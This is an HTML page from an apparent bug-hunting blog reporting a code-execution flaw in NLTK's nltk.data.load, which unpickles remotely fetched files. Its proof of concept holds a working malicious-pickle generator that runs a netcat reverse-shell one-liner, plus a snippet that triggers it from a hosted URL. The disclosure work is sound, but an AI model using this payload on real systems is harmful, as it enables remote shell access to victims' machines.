@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Command injection via unsafe pickle.loads in nltk.data.load in NLTK | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Command injection via unsafe pickle.loads in nltk.data.load in NLTK" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Name" />
+<meta property="og:description" content="Name" />
+<link rel="canonical" href="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-06-28T10:31:06+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Command injection via unsafe pickle.loads in nltk.data.load in NLTK" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-06-28T10:31:06+08:00","datePublished":"2024-06-28T10:31:06+08:00","description":"Name","headline":"Command injection via unsafe pickle.loads in nltk.data.load in NLTK","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html"},"url":"http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Command injection via unsafe pickle.loads in nltk.data.load in NLTK</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-06-28T10:31:06+08:00" itemprop="datePublished">Jun 28, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Command injection via unsafe pickle.loads in nltk.data.load</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-94: Code Injection</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>3.8.1</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The NLTK api <a href="https://www.nltk.org/api/nltk.data.html?highlight=load#nltk.data.load"><code class="language-plaintext highlighter-rouge">nltk.data.load</code></a> is used to load a given resource from the NLTK data package, and it supports load pickle packages from remote sources. However, after the pickle file is downloaded, it uses <code class="language-plaintext highlighter-rouge">pickle.load</code> method to load the file which causing a malicious pickle file executing arbitrary code on victim’s mechine.</p>
+
+<p>The vulnerable function: <a href="https://github.com/nltk/nltk/blob/8c233dc585b91c7a0c58f96a9d99244a379740d5/nltk/data.py#L754"><code class="language-plaintext highlighter-rouge">nltk.data.load</code></a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load(
+    resource_url,
+    format="auto",
+    cache=True,
+    verbose=False,
+    logic_parser=None,
+    fstruct_reader=None,
+    encoding=None,
+):
+    
+    resource_url = normalize_resource_url(resource_url)
+    resource_url = add_py3_data(resource_url)
+
+    ...
+    # Load the resource.
+    opened_resource = _open(resource_url)
+
+    if format == "raw":
+        resource_val = opened_resource.read()
+    elif format == "pickle":
+        # vulnerable to code execution attacks !!!!!
+        resource_val = pickle.load(opened_resource)
+    elif format == "json":
+    ...
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>Firstly, create a malicious pickle file and upload to github.</p>
+
+<h3 id="payloadpickle"><code class="language-plaintext highlighter-rouge">payload.pickle</code></h3>
+
+<p>Use following snippets to create a malicous pickle payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
+import os
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
+               '/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f')
+        return os.system, (cmd,)
+
+with open('payload.py.debug_pkl', 'wb') as f:
+    pickle.dump(RCE(), f)
+</code></pre></div></div>
+
+<p>I have uploaded the <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle"><code class="language-plaintext highlighter-rouge">payload.pickle</code></a> to github for testing.</p>
+
+<h2 id="start-attack">Start attack</h2>
+
+<p>Install latest NLTK:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install nltk
+</code></pre></div></div>
+
+<p>Use following snippets to trigger the unsafe <code class="language-plaintext highlighter-rouge">pickle.loads</code> command injection:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from nltk.data import load
+load("https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle")
+</code></pre></div></div>
+
+<p>After the command executed, we can check the <code class="language-plaintext highlighter-rouge">/tmp/f</code> file is created.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /tmp/f
+prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
+</code></pre></div></div>
+<h2 id="colab">Colab</h2>
+
+<p>Tested on google colab: <a href="https://colab.research.google.com/drive/160HoB0-PdFqOzBoUch7hj3n9olm2sfS1?usp=sharing">https://colab.research.google.com/drive/160HoB0-PdFqOzBoUch7hj3n9olm2sfS1?usp=sharing</a></p>
+
+<p><img src="http://live.staticflickr.com/65535/53820920049_03d7b6ff6e_h.jpg" alt="image" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. If victims load a malicious pickle file from remote sources using <code class="language-plaintext highlighter-rouge">nltk.data.load</code>, command injection can be achieved.</p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/nltk/nltk/blob/8c233dc585b91c7a0c58f96a9d99244a379740d5/nltk/data.py#L754">nltk.data.load#L754</a></p>
+
+
+  </div><a class="u-url" href="/command-injection/2024/06/28/command-injection-in-nltk.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
